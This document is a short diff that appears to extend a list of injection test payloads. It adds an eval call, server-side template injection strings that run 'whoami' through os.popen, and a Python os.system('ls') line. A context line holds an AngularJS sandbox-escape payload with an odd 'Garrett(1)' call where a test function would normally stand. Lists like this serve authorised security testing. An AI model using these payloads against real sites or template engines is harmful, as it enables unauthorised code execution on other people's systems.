@@ -1,1 +1,5 @@
+eval("echo 123");
+{% import "os" %}{{ os.popen("whoami").read() }}
+__import__('os').system('ls')
 <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js"></script><div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} Garrett(1);//');}}</div>
+{{ self.template.module.os.popen('whoami').read() }}
